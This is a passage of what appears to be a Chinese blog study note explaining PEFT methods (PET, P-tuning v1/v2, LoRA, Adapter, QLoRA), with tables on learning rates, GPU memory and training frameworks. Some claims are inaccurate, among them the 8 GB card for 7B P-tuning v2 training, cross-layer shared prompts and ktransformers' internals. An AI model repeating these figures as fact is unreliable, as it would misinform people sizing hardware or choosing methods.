<li>任务切换极灵活：每个任务对应一套前缀，换任务只需要换前缀，不用重新训练模型，像 “换模板” 一样方便；</li>
<li>参数量极致少：每套前缀只有几十到几百个 token，多任务的总参数量也远低于 LoRA/Adapter；</li>
<li>原模型能力保留好：全程冻结原模型，不会破坏通用生成能力，多任务之间干扰小。</li>
<li>训练参数量仅与提示长度相关，是所有方法中最少的，同时能强大地保全模型，完全避免灾难性遗忘。</li>
</ol>
</li>
<li>补充原理：完全冻结整个预训练模型，在输入序列的嵌入向量前拼接一段可训练的"软提示"向量，在微调时只优化这段软提示向量，使其学会触发模型内部与任务相关的知识(应该就是说，拼接内置的prompt 来实现调整，而不是其他的那种微调)</li>
</ol>
<h4 data-id="heading-7">5 提示调整: prompt/pattern tuning (<strong>PET</strong>：Pattern-Exploiting Training)（<strong>MASK</strong>）：</h4>
<ol>
<li>
<p>核心是把分类等任务 “包装” 成模型预训练时的完形填空（MLM）任务，通过模板与标签词映射，用少量样本高效训练，全程冻结原模型，只微调 MLM 头部权重。</p>
<ol>
<li>和预训练时候 MLM 无监督不同，PET 必须有目标(标签词)，不然训练方向就歪了，这是有方向的微调训练</li>
</ol>
</li>
<li>
<p>调整流程(以情感分析为例)：</p>
<ol>
<li>设计模版：给输入加一句带 <code>[MASK]</code> 的自然语言引导，把任务转成完形填空。
<ul>
<li>例：输入 “这部电影超好看” → 模板化后：“这部电影超好看。它是 [MASK]。”</li>
<li>作用：引导模型在 <code>[MASK]</code> 位置预测与任务相关的词。</li>
</ul>
</li>
<li>建立标签词映射：把任务标签（如 “正面 / 负面”）对应到具体词汇，作为 <code>[MASK]</code> 的目标输出。
<ul>
<li>例：正面→“精彩”，负面→“糟糕”；</li>
<li>本质：用模型熟悉的 “填词” 目标替代陌生的分类目标。</li>
</ul>
</li>
<li>构建训练样本：拼接成 “输入文本 + 模板” 格式，标签映射为目标词：
<ul>
<li>输入：<code>[CLS] 这部电影超好看 [SEP] 它是 [MASK] [SEP]</code></li>
<li>目标：<code>[MASK]</code> 位置预测为 “精彩”（对应正面情感）。</li>
</ul>
</li>
<li>训练模型
<ul>
<li>冻结原模型主体，只微调 MLM 预测头；</li>
<li>用交叉熵损失优化，让模型学会 “看到输入 + 模板→填对应标签词”。</li>
</ul>
</li>
<li>推理预测
<ul>
<li>输入拼接模板后送模型，获取 <code>[MASK]</code> 位置的词汇概率；</li>
<li>按 Verbalizer 映射回任务标签（如 “精彩”→正面）。</li>
</ul>
</li>
<li>类比流程：
<ol>
<li>模板就是题干，标签词映射就是对照的参考答案，训练模型根据题干找到对应的参考答案</li>
</ol>
</li>
<li>作用位置：MLM 头部：
<ol>
<li>MLM 头部是预训练时用于预测 [MASK] 词的输出模块，通常由 “全连接层 + 词表 Softmax” 组成：
<ol>
<li>常规下游微调会丢弃该头部，新增分类层；</li>
<li>PET 复用并微调此头部，让 [MASK] 位置输出任务标签词（如 “精彩”→正面情感），通过交叉熵损失优化。</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>
<p>关键特点：</p>
<ul>
<li>
<p><strong>小样本(零样本)友好</strong>：模板 + 映射让模型复用预训练知识，少量标注即可见效；</p>
</li>
<li>
<p><strong>无额外参数</strong>：不新增网络结构，仅微调 MLM 头部，显存占用低；</p>
</li>
<li>
<p><strong>可解释性强</strong>：比如：推理时能直观看到模型结果，不像其他方法只给个标签，不知道中间逻辑。</p>
</li>
<li>
<p><strong>可集成优化</strong>：多个模板加权预测（Pattern Ensembling）提升鲁棒性。</p>
</li>
</ul>
</li>
</ol>
<h4 data-id="heading-8">6 P-tuning v1：</h4>
<ol>
<li>“只训提示、不动模型” 的高效微调，核心是在输入前加一组可训练的 “虚拟提示向量”，用小型提示编码器优化，全程冻结预训练大模型，以极低参数量适配分类等任务</li>
<li>调整流程：
<ol>
<li>准备预训练模型</li>
<li>插虚拟提示 + 配编码器
<ol>
<li>插入 5-20 个 “虚拟提示 token”（无实际词义，就是一组待优化的向量），放在输入最前面，比如 <code>[P1, P2, P3, P4, P5, 这部电影超好看]</code>；</li>
<li>加一个 “提示编码器”（通常是 BiLSTM+MLP 的小网络），类似 “专门调教虚拟提示的小老师”，BiLSTM 负责教向量懂序列逻辑，MLP 负责做最后适配。
<ol>
<li>BiLSTM：虚拟提示是序列向量，LSTM 擅长学序列依赖，BiLSTM 能前后双向捕捉提示向量间的关联，比单纯 MLP 效果好；</li>
<li>MLP：做一次非线性变换，让提示向量能更好适配下游任务，相当于给 LSTM 的输出再精调一下；</li>
</ol>
</li>
</ol>
</li>
<li>定任务模板 + 标签映射
<ol>
<li>模板：把任务转成完形填空，比如 <code>[P1,P2,P3,P4,P5] 这部电影是[MASK]的</code>；
<ol>
<li>PET 是离散模板，因为都是文字模板</li>
<li>P-turning 是连续向量，因为是编码后的结果</li>
</ol>
</li>
<li>标签映射：人工标签→模型要填的词，比如 “正面→精彩，负面→糟糕”。</li>
</ol>
</li>
<li>输入的拼接与编码：把虚拟提示向量（经编码器生成）和原始文本的词嵌入拼在一起，形成模型能认的输入向量序列。</li>
<li>模型推理算输出：模型按正常流程处理输入，重点预测 [MASK] 位置该填啥（目标是 “精彩” 或 “糟糕”）。</li>
<li>训练：
<ol>
<li>用交叉熵损失，比较模型预测的词和人工标签映射的词（比如模型填了 “一般”，就和目标 “精彩” 算差距）。</li>
<li>损失只回传给提示编码器和虚拟提示向量，<strong>模型主体参数一动不动</strong>—— 相当于 “只罚小教练，不罚大模型”。
<ol>
<li>本质来说就是单独训练提示编码器模型，因为预训练模型的参数是不动的，预训练模型只是用来提取信息</li>
<li>如何只罚小教练呢？<strong>靠 “禁止大模型参数计算梯度” 实现梯度只传提示编码器</strong>：实际操作只需要requires_grad=False 即可实现，这样就可以让大模型完全不参与，而小模型的梯度是可更新的。</li>
</ol>
</li>
</ol>
</li>
<li>推理：
<ol>
<li>加载提示 + 拼输入：把训练好的虚拟提示向量和编码器加载进来，和新文本拼接成输入。
<ol>
<li>编码器就是上面训练好的提示编码器模型，这个模型来根据新文本动态生成虚拟提示向量，这是该方法的核心</li>
</ol>
</li>
<li>预测 + 映射回标签：模型填 [MASK] 后，把词映射回人工标签（比如 “精彩”→正面），输出最终结果。</li>
</ol>
</li>
<li>与 PET 和前缀提示的关系：
<ol>
<li>继承 PET 的核心：把下游任务（比如分类）转成<strong>完形填空（MLM）任务</strong>，靠 [MASK] 预测 + 标签词映射出结果，复用模型预训练知识，小样本效果好；</li>
<li>继承前缀调整的核心：用<strong>可训练的虚拟提示向量</strong>（不是 PET 的离散文字模板），放在输入最前面引导任务，参数量极少；</li>
<li>通俗说：P-tuning v1 = PET 的 “完形填空解题思路” + 前缀调整的 “虚拟前缀引导”，取两者之长，补两者之短。</li>
</ol>
</li>
</ol>
</li>
</ol>
<h4 data-id="heading-9">7 P-tuning v2:</h4>
<ol>
<li>核心就是：<strong>冻结预训练大模型，在 Transformer 每一层都插入可学习的虚拟提示向量（前缀），并训这些小参数</strong>，效果追平全量微调但成本极低</li>
<li>关键：和 v1 比，v2 去掉了 BiLSTM/MLP 编码器，直接在每层插提示，效果更直接、训练更简单</li>
<li>调整流程(以情感分类为例)：
<ol>
<li>准备预训练模型</li>
<li>插入虚拟提示：在 Transformer 每一层的 Self-Attention 里，给 Key 和 Value 都加一组 “虚拟前缀向量”（Kp、Vp），这些是唯一要训的参数（约占模型 0.1%-3%）。
<ol>
<li>虚拟前缀向量长度一般在 10-20 token 之间，每层的自注意力中虚拟前缀向量长度相同</li>
<li><strong>关于在框架中如何实现 Q/K/V 的自动化划分</strong>：
<ol>
<li>首先输入只有一份，但是 QKV 对应的权重参数矩阵并不一样，从而让输入的数据向 QKV 三个方向生成</li>
<li>这样生成后的 QKV 才能生成注意力计算的值</li>
<li>如何初始化参数矩阵呢？
<ol>
<li>值太大：输入经过线性变换后会变成超大数，激活后全是 1/0，梯度直接消失；</li>
<li>值太小：输入变换后全是接近 0 的数，梯度也传不下去；</li>
</ol>
</li>
<li>初始化方法：
<ol>
<li>Xavier 初始化（也叫 Glorot 初始化）
<ol>
<li>核心定位：适合用「Sigmoid/Tanh」激活函数的层（比如早期 Transformer 的部分层）</li>
<li>逻辑：让权重的初始值满足 “输入层的方差 = 输出层的方差”—— 简单说就是 “输入经过权重变换后，数值规模不变”。</li>
<li>权重从<strong>均匀分布</strong>中随机采样，采样范围由 “输入维度 (in) + 输出维度 (out)” 决定：范围：<code>[-√(6/(in+out)), √(6/(in+out))]</code></li>
</ol>
</li>
<li>He 初始化（也叫 Kaiming 初始化）
<ol>
<li>核心定位：适合用「ReLU/Leaky ReLU」激活函数的层（比如 CNN、现代 Transformer 的 FFN 层）。</li>
<li>逻辑：ReLU 会把负数变成 0，相当于 “丢了一半信息”，所以 He 初始化在 Xavier 基础上 “补了这一半”—— 让输出方差 = 2× 输入方差。</li>
<li>权重从<strong>正态分布</strong>中随机采样，均值为 0，标准差由 “输入维度 (in)” 决定：标准差：<code>√(2/in)</code></li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>初始化提示向量
<ul>
<li>简单版：随机初始化；</li>
<li>高效版：用任务相关词的词嵌入初始化（如分类任务用 “好 / 坏” 的向量），减少训练步数。
<ul>
<li>直接从预训练模型中提取提示向量</li>
</ul>
</li>
</ul>
</li>
<li>输入拼接：
<ul>
<li>原始文本 → 经过模型的词嵌入层，直接转成标准词嵌入；</li>
<li>每层都把 “虚拟前缀向量（Kp、Vp）” 拼到原始 Key/Value 前面，形成新的输入张量。</li>
</ul>
</li>
<li>前向计算：模型按正常流程算注意力、FFN，但每层都先看前缀向量，相当于 “先记住任务要求再处理文本”。
<ol>
<li>先记住是因为拼接在向量最前方，注意力机制会先注意到，然后起到引导的作用</li>
</ol>
</li>
<li>计算损失：用任务标签（如分类的 “正 / 负”）算损失，只针对提示向量的输出。</li>
<li>加载参数：不用动大模型，只加载训练好的 “每层虚拟前缀向量”。</li>
<li>生成输出
<ul>
<li>新文本 → 转词嵌入；</li>
<li>每层自动拼接前缀向量，模型按训练好的 “引导逻辑” 计算，输出结果。
<ul>
<li>可以类比 T5 模型训练，前缀向量会通过训练学习到如何匹配合适的文本</li>
</ul>
</li>
<li>注：有点类似前缀调整，不同的文本加入训练好的不同前缀向量，只是一个在输入层添加，一个是每层自注意力层都添加</li>
</ul>
</li>
<li>通俗说：训练是 “教每层怎么看提示”，推理是 “直接用学会的提示引导每层干活”。</li>
</ol>
</li>
<li>核心优势（碾压 v1 和很多方法）
<ol>
<li>效果强：每层都插前缀，引导力贯穿模型全程，<strong>小样本场景下效果追平全量微调</strong>，比 LoRA/Adapter 在小样本任务上更稳；</li>
<li>结构极简：去掉了 v1 的 BiLSTM 编码器，直接插前缀向量，代码实现比 v1 简单，训练速度更快；</li>
<li>显存占用低：只训前缀向量，参数量只有原模型的 0.1%~3%，普通 8G 显卡就能跑 7B 模型的微调；</li>
<li>多任务灵活：一个模型配多套前缀，换任务只换前缀，不用重新训练模型。</li>
</ol>
</li>
<li>适用场景（精准匹配优势）
<ol>
<li>小样本 / 极低样本任务
<ol>
<li>比如只有 10~100 条标注数据的分类任务（医疗文本分类、法律文书分类），其他方法容易过拟合，P-tuning v2 能稳住效果。</li>
</ol>
</li>
<li>多任务混合场景
<ol>
<li>比如一个模型要同时做 “情感分类 + 文本匹配 + 意图识别”，换任务只加载对应前缀，切换成本极低。</li>
</ol>
</li>
<li>大模型轻量化微调
<ol>
<li>比如 7B/13B 规模的模型，全量微调显存不够，用 P-tuning v2 能以极低显存成本完成适配。</li>
</ol>
</li>
</ol>
</li>
<li>P-turning v1 和 v2 的设计导致的缺点：
<ol>
<li>生成类任务效果一般
<ul>
<li>设计初衷是为了分类任务，做文本生成（写文案、写摘要）时，效果不如前缀调整 —— 因为生成需要长序列引导，而 P-tuning 的前缀是针对每层注意力的，对生成的连贯性支持不足。</li>
</ul>
</li>
<li>对前缀长度敏感
<ul>
<li>前缀长度选得不好（太短引导力不够，太长参数量爆炸），效果会断崖式下降；而 LoRA 只需要调一个<code>r</code>（秩）参数，容错率更高。</li>
</ul>
</li>
<li>推理时要额外加载前缀
<ul>
<li>虽然前缀体积小，但相比 PET（不用加载额外参数），部署时要多存一套前缀文件；而 LoRA 可以把低秩矩阵合并到原模型，部署更省心。</li>
</ul>
</li>
<li>深层任务调试麻烦
<ul>
<li>每层都有前缀，出问题时很难定位是哪一层的前缀出了问题；而 Adapter 是每层插一个独立模块，调试更方便。</li>
</ul>
</li>
</ol>
</li>
</ol>
<h4 data-id="heading-10">8 区别：</h4>
<ol>
<li>
<p>LoRA与适配器调整的主要区别在于(比较重要)：</p>
<ol>
<li>LoRA：在模型的权重矩阵中引入低秩矩阵来实现微调。这些低秩矩阵作为原有权重矩阵的外挂项，在实际计算时对原有权重矩阵的输出进行调整。(改原权重的局部，推理更快)</li>
<li>适配器调整：通过在模型各层中添加小型神经网络模块，即“适配器”，来实现微调。适配器独立于模型的主体结构，仅适配器的参数在微调过程中更新，而模型的其他预训练参数保持不变。和 LoRA 一样是在输出的时候多了外挂项(多任务学习和管理上更为直观，推理速度稍慢)</li>
<li>显存占用方面差不多</li>
</ol>
</li>
<li>
<p>提示调整与P-Tuning的主要区别在于：</p>
<ol>
<li>提示调整：使用静态的、可训练的虚拟标记嵌入，在初始化后保持固定，除非在训练过程中更新。这种方法相对简单，因为它只涉及调整一组固定的嵌入参数，在处理多种任务时表现良好，但可能在处理特别复杂或需要细粒度控制的任务时受限</li>
<li>P-Tuning：使用一个可训练的LSTM模型（称为提示编码器prompt_encoder）来动态生成虚拟标记嵌入，允许根据输入数据的不同生成不同的嵌入，提供更高的灵活性和适应性，适合需要精细控制和理解复杂上下文的任务。这种方法相对复杂，因为它涉及一个额外的LSTM模型来生成虚拟标记嵌入。</li>
</ol>
</li>
<li>
<p>除此之外的方法：</p>
<ol>
<li>除了以上PEFT，当前还存在PILL（Pluggable Instruction Language Learning）、SSF（Scaling &amp; Shifting Your Features）(<strong>IA³（通过缩放激活值来微调）、BitFit（仅偏置项微调新兴技术）</strong>)等其他类型的微调方法。
<ol>
<li>PILL是PEFT的一个特定实现，特别关注于如何通过插入可训练的模块或插件来提升模型的任务适应性。这些插件被设计为与原始模型协同工作，以提高模型在处理特定任务时的效率和效果。</li>
<li>SSF核心思想是对模型的特征（即模型层的输出）进行缩放（Scaling）和位移（Shifting）。简单来说，就是通过调整特征的比例和偏移量来优化模型的性能。</li>
</ol>
</li>
<li>这种方法可以在改善模型对特定任务的响应时，不需要调整或重新训练模型中的所有参数，从而在节省计算资源的同时保持或提升模型性能。这对于处理大规模模型特别有效，因为它减少了训练和调整所需的资源和时间。</li>
</ol>
</li>
<li>
<p>微调策略：</p>
<ol>
<li>微调与迁移学习：微调实际上是迁移学习(宏观概念)的一个实例，其中预训练的模型（通常在大型通用数据集上训练）被用作特定任务的起点。这种方法使得即使是对于小数据集的任务，也可以实现高效的学习</li>
<li>选择微调策略：选择哪种微调方法取决于多个因素，包括任务的复杂性、可用的数据量、计算资源和期望的性能。
<ol>
<li>例如，对于需要细粒度控制的复杂任务，P-Tuning v2或LSTM基础的P-Tuning可能更适合。而对于计算资源有限的情况，可以选择LoRA或Adapter Tuning等方法。</li>
</ol>
</li>
<li>微调与模型泛化能力：微调时需要注意的一个关键问题是保持模型的泛化能力。过度的微调可能会导致模型对特定训练数据过拟合，而忽略了其在实际应用中的泛化能力。</li>
</ol>
</li>
</ol>
<h4 data-id="heading-11">9 场景适配总结：</h4>
<ol>
<li><strong>内存与速度权衡</strong>
<ul>
<li>极致内存优化：QLoRA（5%~10%）&gt; P-Tuning v2（3%~10%）&gt; Prefix Tuning（5%~15%）&gt; LoRA（10%~30%）&gt; Adapter（15%~40%）</li>
<li>推理速度优先级：Full Fine-tuning ≈ LoRA（合并后）&gt; QLoRA &gt; P-Tuning v2 &gt; Prefix Tuning &gt; Adapter</li>
</ul>
</li>
<li><strong>方法间关系</strong>
<ul>
<li>LoRA 与 QLoRA：QLoRA 通过量化进一步压缩内存，是 LoRA 在超大规模模型场景的延伸</li>
<li>Adapter 与 Prefix/P-Tuning：Adapter 侧重特征变换，Prefix/P-Tuning 侧重任务提示，分别适配不同任务类型</li>
<li>所有 PEFT 方法均以 “冻结主干、训练增量参数” 为核心，区别在于参数注入位置与变换方式</li>
</ul>
</li>
<li><strong>选择建议</strong>
<ul>
<li>通用任务优先选 LoRA（平衡性能与效率）</li>
<li>超大模型选 QLoRA（显存是核心约束）</li>
<li>多任务选 Adapter（灵活切换）</li>
<li>生成任务选 Prefix/P-Tuning v2（提示引导能力强）</li>
<li>资源充足时用全参数微调（追求极限性能）</li>
</ul>
</li>
</ol>





























































<table><thead><tr><th>方法</th><th>核心思路</th><th>适用场景</th><th>推理速度</th><th>优缺点</th><th>与其他方法关系</th></tr></thead><tbody><tr><td>LoRA</td><td>冻结主干，训练低秩矩阵（A/B），推理时合并到原权重</td><td>通用 NLP 任务（分类 / 生成）、中等规模模型、多任务快速切换</td><td>无额外延迟</td><td>✅ 参数少（0.1%-5%）、性能接近全量；❌ 对低秩假设敏感</td><td>Adapter 的低秩替代，比 Prefix Tuning 性能更稳</td></tr><tr><td>QLoRA</td><td>4-bit 量化主干 + LoRA，训练时冻结量化权重</td><td>超大模型（65B+）、显存受限场景（单卡训练）、边缘部署</td><td>接近 LoRA</td><td>✅ 极致显存节省、支持超大规模模型；❌ 训练速度略慢（-15%~-30%）</td><td>LoRA 的量化增强版，兼顾低内存与性能</td></tr><tr><td>Adapter</td><td>插入瓶颈层（如 Down→ReLU→Up），仅训练新增模块</td><td>多任务并行、跨模态适配、轻量级模型定制</td><td>延迟 + 10%~30%（额外前向计算）</td><td>✅ 模态解耦好、多任务灵活；❌ 结构侵入性、推理延迟</td><td>与 LoRA 互补，适合多任务但不适合低延迟场景</td></tr><tr><td>Prefix Tuning</td><td>训练任务相关前缀向量，注入注意力层</td><td>文本生成（摘要 / 对话）、小样本学习</td><td>延迟 + 5%~15%（前缀处理）</td><td>✅ 生成任务性能优、参数极少；❌ 超参敏感（长度 / 位置）</td><td>Prompt Tuning 的结构化升级，适合生成任务</td></tr><tr><td>P-Tuning v2</td><td>统一提示层设计，跨层共享提示向量</td><td>复杂问答、创意写作、领域知识增强</td><td>延迟 + 5%~10%</td><td>✅ 提示泛化强、适配多任务；❌ 训练稳定性依赖超参</td><td>Prefix Tuning 的改进版，解决提示冲突问题</td></tr><tr><td>Full Fine-tuning</td><td>所有参数可训练，无结构改动</td><td>领域深度定制（医疗 / 法律）、海量数据场景</td><td>基准速度（无额外开销）</td><td>✅ 性能上限高；❌ 成本极高、易过拟合</td><td>所有 PEFT 方法的性能参考基准</td></tr></tbody></table>
<ol>
<li>
<p>方法通用的可选增强技巧：</p>
<ol>
<li>
<p>对比微调（Contrastive Fine-Tuning）：让模型"分清好坏"</p>
<ol>
<li>通俗解释：训练时不光给正样本，还给负样本，让模型学会 “对比着判断”。
<ol>
<li><strong>锚样本（Anchor）</strong>：原始输入文本 → 比如 “这部电影超好看”；</li>
<li><strong>正样本（Positive）</strong>：锚样本的<strong>正确标签词</strong> → 比如 “精彩”（对应正面情感）；</li>
<li><strong>负样本（Negative）</strong>：锚样本的<strong>错误标签词 / 同类错误文本</strong> → 比如 “糟糕”（对应负面情感）、“这部电影超烂”。</li>
</ol>
</li>
<li>通过对比损失函数（如InfoNCE）拉近正样本距离，推远负样本距离
<ol>
<li>最常用的损失是 <strong>InfoNCE 损失</strong>，核心逻辑是：
<ol>
<li>让<strong>锚样本和正样本的特征向量尽可能接近</strong>（相似度越高越好）；</li>
<li>让<strong>锚样本和负样本的特征向量尽可能远离</strong>（相似度越低越好）；</li>
<li>损失函数会惩罚 “锚正离得远”“锚负离得近” 的情况，逼着模型学出精准的特征。</li>
</ol>
</li>
</ol>
</li>
<li>适用场景：语义相似度计算；检索增强生成；对话系统</li>
<li>数据构造：正样本：语义相似的文本对；  负样本：随机采样或困难负样本挖掘</li>
</ol>
</li>
<li>
<p>渐进式解冻（Progressive Unfreezing），比较适合：P-tuning v2/Adapter/LoRA</p>
<ol>
<li>通俗解释：训练前期<strong>冻结全部模型参数</strong>，训练后期<strong>解冻模型最后 1~2 层</strong>，一起微调。</li>
<li>原因：模型浅层学的是通用特征（比如字词），深层学的是任务特征（比如语义）；后期解冻深层，能让模型更好地适配任务。</li>
<li>作用：效果能再涨 1~3 个点，但代价是显存占用增加（因为要训模型深层参数）。</li>
<li>优点：
<ol>
<li>效果提升明显：解冻深层后，模型能把小模块的任务特征和深层语义结合，准确率涨 1~3 个点；</li>
<li>避免过拟合：前期小模块学任务规则，后期解冻深层不会破坏已学知识</li>
</ol>
</li>
<li>缺点：
<ol>
<li>显存占用增加：解冻模型层后，要计算这些层的梯度，显存多占 20%~30%；</li>
<li>调试成本变高：要调 “解冻时机”“解冻层数” 两个超参数，比纯训小模块麻烦；</li>
<li>部署更复杂：解冻后模型参数变了，要保存 “原模型 + 小模块 + 解冻层参数”，比纯小模块部署麻烦
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df5f0f82b3344aaf969b35a623ad9336~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767866884&amp;x-signature=3G9%2F5yZIfpQ2DsRL9p811zSI99g%3D" alt="在这里插入图片描述" loading="lazy"/></li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h4 data-id="heading-12">10 额外知识补充：</h4>
<ol>
<li>
<p>关于学习率的选择</p>





















































<table><thead><tr><th>微调场景</th><th>模型规模</th><th>推荐学习率范围</th><th>优化器及关键参数</th><th>核心适用条件</th><th>备注</th></tr></thead><tbody><tr><td>常规微调（文本生成 / 问答）</td><td>7B/13B（主流）</td><td>1e-5 ～ 3e-5</td><td>AdamW（默认参数）</td><td>通用场景，标注数据量充足（≥10 万条）</td><td>优先选 1e-5 试跑，效果不佳再上调</td></tr><tr><td>精细化微调（小数据集）</td><td>7B/13B</td><td>5e-6 ～ 1e-5</td><td>AdamW（权重衰减 0.01）</td><td>标注数据量＜10 万条</td><td>低学习率 + 权重衰减，避免过拟合</td></tr><tr><td>超大规模模型微调</td><td>100B+</td><td>1e-7 ～ 5e-6</td><td>AdamW（低权重衰减）</td><td>千亿级大模型适配</td><td>极低学习率保护预训练知识，防止参数震荡</td></tr><tr><td>小模型训练 / 微调</td><td>1B 以下</td><td>5e-5 ～ 1e-4</td><td>Adam 或 SGD（动量 0.9）</td><td>小模型适配，数据量充足</td><td>高学习率加速收敛，SGD 适合简单任务</td></tr><tr><td>多轮对话 / 任务适配</td><td>7B/13B</td><td>3e-6 ～ 2e-5</td><td>AdamW + 学习率衰减</td><td>特定任务（如对话、指令跟随）</td><td>后期逐步降速，提升任务适配稳定性</td></tr></tbody></table>
</li>
<li>
<p>模型跑起来的显存如何计算？</p>
<ol>
<li>
<p>推理所需显存：推理显存 ≈ 模型参数总量 × 单参数精度字节数</p>






























<table><thead><tr><th>FP64</th><th>8</th><th>精度最高，显存占用最大，仅用于科学计算，LLM 推理 / 训练几乎不用</th></tr></thead><tbody><tr><td>FP32</td><td>4</td><td>标准浮点精度，部分老模型推理用，显存占用是 FP16 的 2 倍</td></tr><tr><td>FP16</td><td>2</td><td>LLM 主流推理精度，平衡显存与精度，大部分场景首选</td></tr><tr><td>BF16</td><td>2</td><td>与 FP16 字节数相同，动态范围更广，适合 GPU 训练加速</td></tr><tr><td>INT8</td><td>1</td><td>量化精度，显存仅为 FP16 的 1/2；<strong>注意</strong>：仅能表示 [-128, 127] 整数，需专用量化框架（如 GPTQ），推理时需反量化，精度略有损失</td></tr></tbody></table>
</li>
<li>
<p>训练所需显存：保守估算：训练显存 ≈ 推理显存 × 4；全参数微调经验值：训练显存 ≈ 模型参数总量 × 20 字节</p>
<ol>
<li>训练需要的显存：训练的参数类型，只能是 float / BF16；</li>
<li>最小训练所需显存保守估算是同参数同类型llm 推理 的 4倍；</li>
<li>基本上用参数乘以20倍就是实际全参数微调使用的显存大小</li>
</ol>















<table><thead><tr><th>FP16/BF16</th><th>2</th><th>训练显存包含 <strong>4 部分核心开销</strong>：1. 模型参数本身（1×）2. 梯度信息（1×）3. 优化器状态（如 AdamW 占 2×，共 4× 基础显存）4. 额外开销：批量数据、中间特征、显存碎片（经验值乘以 20 字节已包含此项）</th></tr></thead><tbody><tr><td>FP32</td><td>4</td><td>极少用于全量训练，显存占用翻倍，仅在需要极高精度时使用</td></tr></tbody></table>
</li>
</ol>
</li>
<li>
<p>微调方法使用框架：</p>
<ol>
<li><strong>新手易上手 / 通用场景首选</strong>：<code>Hugging Face Transformers + PEFT</code>
<ul>
<li>不管是全量微调、LoRA/QLoRA，还是 Prefix/P-Tuning，都能一站式实现，代码模板丰富，社区问题解决快；</li>
<li>搭配<code>accelerate launch</code>命令就能轻松实现多卡训练，无需复杂配置。</li>
</ul>
</li>
<li><strong>大模型显存受限</strong>：<code>Transformers PEFT + bitsandbytes（QLoRA）</code>
<ul>
<li>7B 模型用 4bit 量化，单 8G 显卡就能训；13B 模型单 16G 显卡即可，是中小算力场景的最优解。</li>
</ul>
</li>
<li><strong>千亿级模型全量微调</strong>：<code>DeepSpeed + Transformers</code>
<ul>
<li>开启 ZeRO-3 后，能把显存占用降低 70% 以上，支持多机多卡分布式训练，是工业界大模型微调的标准配置。</li>
</ul>
</li>
<li><strong>中文大模型微调</strong>：<code>ColossalAI</code>
<ul>
<li>对 ChatGLM、Qwen、Baichuan 等中文模型的适配性更好，部分优化逻辑更贴合中文语料特性。</li>
</ul>
</li>
<li><strong>基础核心</strong>：Transformers + PEFT 是所有框架的 “底座”，掌握它后切换其他框架仅需适配少量代码；</li>
<li><strong>性能增强</strong>：
<ol>
<li>Unsloth ：「Transformers PEFT 的性能增强版」，核心解决「慢、费显存」问题，微调优先选；</li>
<li>ktransformers 是「推理优先的优化框架」，核心解决「推理延迟高」问题，推理优先选；</li>
</ol>
</li>
<li><strong>硬件适配</strong>：NVIDIA GPU 优先选 Unsloth/bitsandbytes，AMD/CPU 优先选原生 Transformers。</li>
</ol>





























































<table><thead><tr><th>框架名称</th><th>核心定位</th><th>核心优势</th><th>首选适用场景</th><th>关键限制</th></tr></thead><tbody><tr><td><strong>Hugging Face Transformers + PEFT</strong></td><td>业界标配，全场景通用微调框架</td><td>1. 一站式支持所有微调方法（全量 / LoRA/QLoRA/P-Tuning/Adapter 等）；2. API 极简，新手易上手；3. 无缝对接 Datasets/Accelerate 生态；4. 适配所有主流模型（Llama/ChatGLM/Qwen 等）</td><td>所有微调场景（7B/13B 模型、分类 / 生成 / 多模态任务），新手首选</td><td>训练速度 / 显存效率一般，无极致优化</td></tr><tr><td><strong>Unsloth</strong></td><td>Transformers PEFT 的性能增强版（极速微调）</td><td>1. 训练速度比原生快 2-5 倍（CUDA 内核优化）；2. 显存再降 30%（4bit 预量化模型直接微调）；3. API 完全兼容 Transformers PEFT，几乎无需改代码</td><td>7B/13B/70B 模型极速微调、显存极度受限（单 8G/16G NVIDIA 卡）</td><td>仅支持 NVIDIA GPU，AMD/CPU 不兼容</td></tr><tr><td><strong>ktransformers (ktrans)</strong></td><td>高性能推理优先的微调 / 推理框架</td><td>1. 推理速度比原生快 3-10 倍（TensorRT/ONNX 编译优化）；2. 支持微调 + 推理一体化；3. 适配中文模型推理量化</td><td>微调后需要低延迟高吞吐推理（产品级部署、边缘设备）</td><td>微调功能不如 Transformers 丰富，配置稍复杂</td></tr><tr><td><strong>DeepSpeed</strong></td><td>超大规模模型显存优化训练框架</td><td>1. ZeRO-1/2/3 显存优化，千亿级模型单卡 / 多卡训练；2. 集成混合精度、梯度累积；3. 兼容 Transformers</td><td>100B + 级模型全量微调、多机多卡分布式训练</td><td>配置复杂，需写 json 配置文件</td></tr><tr><td><strong>bitsandbytes</strong></td><td>QLoRA 量化微调核心依赖</td><td>1. 4/8bit 量化，7B 模型单 8G 卡即可训练；2. 无缝对接 Transformers/Unsloth</td><td>显存极度受限的大模型微调（7B/13B/70B）</td><td>仅支持 NVIDIA GPU，量化有轻微精度损失</td></tr><tr><td><strong>ColossalAI</strong></td><td>国产大模型训练框架</td><td>1. 适配中文大模型（ChatGLM/Qwen/Baichuan）；2. 异构并行 / 零冗余优化，显存效率比肩 DeepSpeed</td><td>中文大模型微调、多机多卡分布式训练</td><td>社区支持不如 Hugging Face，文档偏中文</td></tr><tr><td><strong>Megatron-LM</strong></td><td>万亿级模型专用训练框架</td><td>1. 专为千亿 / 万亿参数模型设计；2. 支持模型并行 / 张量并行</td><td>100B + 级模型全量微调（GPT-3 级）</td><td>部署门槛极高，需多节点集群，仅适合大厂</td></tr></tbody></table>
</li>
<li>
<p>参考资料：<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fleah126%2Farticle%2Fdetails%2F149193242" target="_blank" title="https://blog.csdn.net/leah126/article/details/149193242" ref="nofollow noopener noreferrer">1</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.baidu.com%2Farticle%2Fdetail.html%3Fid%3D3552367" target="_blank" title="https://developer.baidu.com/article/detail.html?id=3552367" ref="nofollow noopener noreferrer">2</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fbbs.huaweicloud.cn%2Fblogs%2F466230" target="_blank" title="https://bbs.huaweicloud.cn/blogs/466230" ref="nofollow noopener noreferrer">3</a></p>
</li>
